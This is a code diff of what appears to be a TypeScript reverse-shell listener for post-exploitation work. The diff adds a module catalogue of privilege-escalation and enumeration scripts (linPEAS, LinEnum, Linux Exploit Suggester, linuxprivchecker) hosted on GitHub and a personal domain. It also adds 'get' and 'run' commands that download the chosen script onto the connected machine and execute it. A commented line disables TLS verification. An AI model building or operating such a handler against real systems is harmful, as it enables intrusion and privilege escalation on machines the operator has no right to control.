@@ -13,10 +13,63 @@ import stream, { Duplex, Readable, Writable } from 'stream';
 // require('tls').DEFAULT_ECDH_CURVE = 'auto';
 // process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
 
-const LOAD_MAP = {
-  'linpeas.sh': 'linpeas.sh',
-  'random.sh': 'random.sh',
-  'slideshow.sh': 'slideshow.sh'
+interface F11Module {
+  id: number;
+  name: string,
+  href: string;
+  path?: string,
+  details: string
+}
+
+const LOAD_MAP: { [name: string]: F11Module } = {
+  'random.sh': {
+    id: 0,
+    name: 'random.sh',
+    href: 'https://f11snipe.sh/sh/random.sh',
+    details: 'Random ASCII Art'
+  },
+  'slideshow.sh': {
+    id: 1,
+    name: 'slideshow.sh',
+    href: 'https://f11snipe.sh/sh/slideshow.sh',
+    details: 'Keep showing random ascii art...'
+  },
+  'linpeas.sh': {
+    id: 2,
+    name: 'linpeas.sh',
+    href: 'https://linpeas.sh',
+    details: 'linPEAS!'
+  },
+  'le.sh': {
+    id: 3,
+    name: 'le.sh',
+    href: 'https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh',
+    details: 'Linux Enumeration (LinuxEnum.sh)'
+  },
+  'lse.sh': {
+    id: 4,
+    name: 'lse.sh',
+    href: 'https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh',
+    details: 'Linux Smart Enumeration'
+  },
+  'les.sh': {
+    id: 5,
+    name: 'les.sh',
+    href: 'https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh',
+    details: 'Linux Exploit Suggester'
+  },
+  'lpc.sh': {
+    id: 6,
+    name: 'lpc.sh',
+    href: 'https://raw.githubusercontent.com/linted/linuxprivchecker/master/linuxprivchecker.sh',
+    details: 'Linux Privilege Escalation Check Script (bash)'
+  },
+  'lpc.py': {
+    id: 7,
+    name: 'lpc.py',
+    href: 'https://raw.githubusercontent.com/linted/linuxprivchecker/master/linuxprivchecker.py',
+    details: 'Linux Privilege Escalation Check Script (python)'
+  },
 };
 
 const WEB_HOST = 'https://f11snipe.sh/sh';
@@ -31,6 +84,7 @@ colors.setTheme({
   warn: ['yellow'],
   info: ['black', 'bgCyan'],
   debug: ['dim', 'cyan', 'italic'],
+  details: ['dim', 'cyan', 'italic'],
   error: ['red', 'underline'],
   module: ['red', 'bold', 'underline'],
   fatal: ['white', 'bgRed', 'bold'],
@@ -174,12 +228,12 @@ class SnipeSocket {
     return `${this.sock.remoteAddress}:${this.sock.remotePort}`
   }
 
-  public reset(): void {
+  public reset(doPrompt = true): void {
     PROMPT = PROMPT_PREFIX + DEFAULT_PROMPT;
     this.loaded = undefined;
     this.inShell = false;
     this.cleanup();
-    this.prompt();
+    if (doPrompt) this.prompt();
   }
 
   public command(data: any, cb?: (code: number|null) => void): void {
@@ -199,11 +253,13 @@ class SnipeSocket {
     } msg('debug', `Not sending command (not inShell): ${data}`);
   }
 
-  public load(target: string, cb?: (code: number|null) => void): void {
-    if (this.loaded && this.loaded.target === target) {
+  public load(target: string | number, cb?: (code: number|null) => void): void {
+    if (this.loaded && this.loaded.name === target) {
       if (cb) cb(0);
       return;
     }
+
+    // TODO: Add find by id (when target is a number)
 
     if (!LOAD_MAP[target]) {
       this.sock.write(colors['warn'](`Missing/unknown module: ${target}`));
@@ -213,8 +269,8 @@ class SnipeSocket {
     }
 
     if (!this.loaded) {
-      this.loaded = { target, out: `${TMP_DIR}/${LOAD_MAP[target]}` };
-      PROMPT = colors.reset('💀 [') + colors['module'](this.loaded.target) + colors.reset('] ') + DEFAULT_PROMPT;
+      this.loaded = LOAD_MAP[target];
+      PROMPT = colors.reset('💀 [') + colors['module'](this.loaded.name) + colors.reset('] ') + DEFAULT_PROMPT;
     }
 
     this.prompt();
@@ -359,9 +415,9 @@ class SnipeSocket {
 
     if (/^w?get|download$/i.test(cmd)) {
       const doShit = () => {
-        const name = this.loaded?.target || args[0];
+        const name = this.loaded?.name || args[0];
         const file = `${TMP_DIR}/${name}`;
-        const url = args[1] || `${WEB_HOST}/${name}`;
+        const url = args[1] || this.loaded?.href || `${WEB_HOST}/${name}`;
 
         this.sock.write(colors.cyan(`Downloading: ${url} -> ${file}`));
         this.sock.write(NEWLINE);
@@ -369,7 +425,15 @@ class SnipeSocket {
         this.download(file, url, (err) => {
           if (err) msg('error', `Failed downloading: ${url} -> ${file}`);
 
-          LOAD_MAP[name] = name;
+          LOAD_MAP[name] = {
+            id: Object.keys(LOAD_MAP).length,
+            name,
+            href: url,
+            path: file,
+            details: args[2] || name
+          };
+
+          this.loaded = LOAD_MAP[name];
 
           this.sock.write(NEWLINE);
           this.sock.write(NEWLINE);
@@ -380,38 +444,21 @@ class SnipeSocket {
         });
       };
 
-      // > get linpeas.sh http://f11snipe.sh/sh/linpeas.sh
-      if (this.loaded) {
+      if (this.loaded || args.length > 0) {
         doShit();
-      } if (args.length === 0) {
-        this.sock.write(colors['warn'](`Usage: get <file> [<url>]`));
-        this.prompt();
       } else {
-        doShit();
+        // > get linpeas.sh http://f11snipe.sh/sh/linpeas.sh
+        this.sock.write(colors['warn'](`Usage: get <file> [<url>] [<details>]`));
+        this.prompt();
       }
     } else if (this.loaded) {
       if (/^run$/i.test(cmd)) {
-        this.run(this.loaded.out);
-      // } else if (/^get|download$/i.test(cmd)) {
-      //   const name = LOAD_MAP[this.loaded.target];
-
-      //   if (!name) {
-      //     this.sock.write(colors['error'](`Missing/invalid target name: ${name}`));
-      //     this.prompt();
-      //     return;
-      //   }
-
-      //   const url = args[1] || `${WEB_HOST}/${name}`;
-
-      //   this.download(name, url, (err) => {
-      //     if (err) msg('error', `Failed downloading: ${url} -> ${name}`);
-
-      //     // LOAD_MAP[name] = name;
-
-      //     this.sock.write(NEWLINE);
-
-      //     this.prompt();
-      //   });
+        if (this.loaded?.path) {
+          this.run(this.loaded.path);
+        } else {
+          this.sock.write(colors['warn'](`File not found. Try running "get" to download from ${this.loaded?.href}`));
+          this.prompt();
+        }
       } else if (/^stop|kill|back|exit$/i.test(cmd)) {
         this.cp?.kill();
         this.reset();
@@ -429,10 +476,18 @@ class SnipeSocket {
       }
     } else if (/^ls|list|show/i.test(cmd)) {
       this.sock.write(colors.cyan(`Available modules:\r\n`));
-      Object.keys(LOAD_MAP).forEach(mod => {
-        const map = LOAD_MAP[mod];
-        this.sock.write(colors.reset(`${NEWLINE}\t☠️ `) + colors.cyan(`'${mod}' => ${map}`));
+      Object.keys(LOAD_MAP).forEach(name => {
+        const mod = LOAD_MAP[name];
+
+        this.sock.write(NEWLINE);
+        this.sock.write(colors.gray(`\t#${mod.id} [`) + colors['module'](name) + colors.gray(`] `));
+        this.sock.write(NEWLINE);
+        this.sock.write(colors['details'](`\t\t- ${mod.details} (${mod.href})`));
+
+        // this.sock.write(colors.reset(`${NEWLINE}\t☠️ `) + colors.cyan(`'${name}' => ${mod.}`));
       });
+
+      this.sock.write(NEWLINE);
       this.prompt();
     } else {
       this.sock.write(colors['warn'](`Command not found: '${cmd}'`));
@@ -461,7 +516,7 @@ server.on('connection', (sock: net.Socket) => {
   msg('info', `[${socket.sig}] New Connection`);
 
   try {
-    socket.reset();
+    socket.reset(false);
     socket.welcome('welcome.txt');
 
     socket.sock.on('close', (hadError: boolean) => {
